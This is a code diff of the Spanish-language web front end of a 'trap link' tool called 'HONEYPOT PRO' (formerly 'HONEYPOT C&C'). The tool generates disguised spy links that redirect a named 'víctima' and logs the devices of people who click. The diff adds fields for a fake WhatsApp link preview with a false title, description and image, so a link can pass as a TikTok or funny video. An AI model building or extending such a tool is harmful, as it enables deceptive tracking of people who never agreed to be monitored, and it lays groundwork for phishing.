@@ -30,11 +30,15 @@
         
         #link-result { display: none; margin-top: 20px; word-break: break-all; background: #2c2c2e; padding: 15px; border-radius: 12px; font-family: monospace; color: var(--green); font-size: 13px; text-align: center; border: 1px dashed var(--gray); }
         .device-icon { float: right; font-size: 20px; opacity: 0.8; }
+
+        /* Estilo para el menú avanzado */
+        .advanced-options { margin-top: 15px; border-top: 1px solid #333; padding-top: 15px; }
+        .toggle-adv { color: var(--green); font-size: 14px; text-align: center; cursor: pointer; margin-bottom: 15px; font-weight: bold; text-decoration: underline; }
     </style>
 </head>
 <body>
 
-    <h1><span class="status-dot"></span>HONEYPOT C&C</h1>
+    <h1><span class="status-dot"></span>HONEYPOT PRO</h1>
 
     <div class="card">
         <h3 style="margin-top:0; margin-bottom:20px;">🕷️ Nueva Trampa</h3>
@@ -44,6 +48,19 @@
         
         <label class="label-input">2. Nombre de Referencia</label>
         <input type="text" id="nombreTrampa" placeholder="Ej: Video Risa WhatsApp">
+        
+        <div class="toggle-adv" onclick="toggleAdvanced()">⚙️ PERSONALIZAR DISFRAZ (CLICK AQUÍ)</div>
+        
+        <div class="advanced-options" id="advOptions" style="display:none;">
+            <label class="label-input">TÍTULO FALSO (WHATSAPP)</label>
+            <input type="text" id="metaTitulo" placeholder="Ej: TikTok - @usuario">
+            
+            <label class="label-input">DESCRIPCIÓN FALSA</label>
+            <input type="text" id="metaDesc" placeholder="Ej: 745.5K me gusta, 203 comentarios...">
+            
+            <label class="label-input">IMAGEN FALSA (URL)</label>
+            <input type="text" id="metaImg" placeholder="(Opcional) Link de imagen previa">
+        </div>
         
         <button class="btn" onclick="crearTrampa()">GENERAR ENLACE ESPÍA</button>
         
@@ -61,35 +78,32 @@
     </div>
 
     <script>
-        // --- LÓGICA DE LA APP ---
+        // Función para abrir/cerrar menú
+        function toggleAdvanced() {
+            let div = document.getElementById('advOptions');
+            div.style.display = (div.style.display === 'block') ? 'none' : 'block';
+        }
 
         async function crearTrampa() {
-            let nombre = document.getElementById('nombreTrampa').value;
-            let url = document.getElementById('urlDestino').value;
-            
-            // Validación básica
-            if(!url) { 
-                alert("⚠️ Falta el Link de Destino\nDebes poner a dónde quieres redirigir a la víctima."); 
-                return; 
-            }
-            if(!nombre) nombre = "Link Disfrazado";
-            
-            // Si el usuario olvidó poner https://, se lo ponemos nosotros
-            if (!url.startsWith('http')) {
-                url = 'https://' + url;
-            }
-            
             let btn = document.querySelector('.btn');
             btn.innerText = "PROCESANDO...";
             
+            let payload = {
+                nombre: document.getElementById('nombreTrampa').value || "Link Disfrazado",
+                url_destino: document.getElementById('urlDestino').value,
+                meta_titulo: document.getElementById('metaTitulo').value,
+                meta_desc: document.getElementById('metaDesc').value,
+                meta_img: document.getElementById('metaImg').value
+            };
+            
+            if(!payload.url_destino) { alert("⚠️ Falta el Link"); btn.innerText = "GENERAR ENLACE ESPÍA"; return; }
+            if(!payload.url_destino.startsWith('http')) payload.url_destino = 'https://' + payload.url_destino;
+
             try {
                 let res = await fetch('/api/crear_trampa', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        nombre: nombre,
-                        url_destino: url  // Enviamos el link real al servidor
-                    })
+                    body: JSON.stringify(payload)
                 });
                 let data = await res.json();
                 
@@ -97,20 +111,15 @@
                 div.style.display = 'block';
                 div.innerText = data.link;
                 
-                btn.innerText = "GENERAR ENLACE ESPÍA";
+                btn.innerText = "¡ENLACE CREADO!";
+                alert("✅ Link Generado. Listo para copiar.");
                 
-                // --- ALERTA DE ÉXITO ---
-                alert("✅ ¡MAGIA REALIZADA!\nLink acortado y disfrazado listo.");
-                
-            } catch(e) { 
-                alert("❌ Error conectando al servidor");
-                btn.innerText = "REINTENTAR";
-            }
+            } catch(e) { alert("Error servidor"); btn.innerText = "REINTENTAR"; }
         }
 
         function copiarLink(elemento) {
             navigator.clipboard.writeText(elemento.innerText);
-            alert("📋 ¡Copiado! Listo para enviar.");
+            alert("📋 ¡Copiado!");
         }
 
         async function cargarLogs() {
@@ -122,7 +131,6 @@
                 if(data.length === 0) html = "<div style='text-align:center; padding:30px; color:#444'>💤 Sin actividad reciente</div>";
                 
                 data.forEach(log => {
-                    // Detección de ícono según dispositivo
                     let icon = "💻";
                     if(log.dispositivo.includes("iPhone")) icon = " iPhone";
                     else if(log.dispositivo.includes("Android")) icon = "🤖 Android";
@@ -140,7 +148,6 @@
             } catch(e) { console.log(e); }
         }
 
-        // Cargar logs automáticamente al abrir la app
         cargarLogs();
     </script>
 </body>
